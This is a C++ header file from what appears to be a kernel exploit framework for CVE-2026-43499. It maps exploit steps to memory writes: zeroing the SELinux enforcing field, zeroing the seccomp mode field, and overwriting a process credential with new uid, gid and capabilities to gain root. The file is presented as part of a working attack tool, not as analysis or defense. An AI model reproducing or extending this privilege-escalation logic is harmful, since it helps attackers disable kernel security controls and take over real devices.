#pragma once
/** @file backend/cve_2026_43499/steps/action.hpp
 *  Which write each step asks for. The decision, separated from the doing.
 *
 *  The runner walks a step set and calls the action with a StepId; what the action owes is only
 *  whether the step worked. This file holds the part of that answer that is a decision rather than
 *  an act: given a step, which WriteRequest does it mean. Keeping it pure is what makes the answer
 *  checkable without a device, a race or a session.
 *
 *  The three steps read the same way, which is why they are one table rather than three functions.
 *  Clearing the SELinux enforcing field, clearing the seccomp mode field and writing a credential
 *  fragment are not three mechanisms: two are the same "clear a field" and the third writes values.
 *  WriteMode names exactly that, and the retired tree's steps.cpp recorded the seccomp result as a
 *  flag for the same reason.
 *
 *  Addresses are passed in and never looked up here. Where a field lives comes from the profile,
 *  which is matched against the running kernel; a component that reached for it would be the second
 *  reader of a fact the session already holds, and the project reads a fact once.
 */
#include <cstdint>

#include "backend/cve_2026_43499/memory/write_request.hpp"
#include "contract/step_catalog.hpp"

namespace ghostlock::backend::cve_2026_43499::steps {
    /** Where the three fields are, for the kernel this run matched. All three from the profile. */
    struct StepTargets final {
        /** The SELinux enforcing field. Cleared, not replaced. */
        std::uintptr_t selinux_enforcing = 0U;
        /** The credential fragment to overwrite: uid, gid and the capability set. */
        std::uintptr_t credential = 0U;
        /** The seccomp mode field. Cleared, not replaced. */
        std::uintptr_t seccomp_mode = 0U;
    };

    /**
     *  The write a step asks for.
     *
     *  @param id      The step. PageCacheWrite is answered with a refused request, because it
     *                 belongs to the other backend's set: a step this backend does not run must be
     *                 refused by name rather than quietly turned into nothing.
     *  @param targets Where the fields are this run.
     *  @return        A request. A step with no target known yet yields Disabled, which
     *                 memory::check_request refuses as NoMode -- the refusal is named, not silent.
     *  @note          Pure: the same step and the same targets always give the same request, so a
     *                 caller can predict it and a test can pin it.
     */
    [[nodiscard]] constexpr memory::WriteRequest request_for(contract::StepId id,
                                                             const StepTargets &targets) noexcept {
        memory::WriteRequest request{};
        if (id == contract::StepId::DisenforceSelinux) {
            request.target = targets.selinux_enforcing;
            request.mode = memory::WriteMode::Zero;
        } else if (id == contract::StepId::SeccompBypass) {
            request.target = targets.seccomp_mode;
            request.mode = memory::WriteMode::Zero;
        } else if (id == contract::StepId::CredentialForgery) {
            request.target = targets.credential;
            request.mode = memory::WriteMode::Credential;
        }
        /* Everything else -- the page cache write, the unknown value -- keeps Disabled. That is a
         *  request the memory layer refuses with a name, so the runner reports a failed step at that
         *  id instead of a step that did nothing and claimed success. */
        return request;
    }
}  // namespace ghostlock::backend::cve_2026_43499::steps
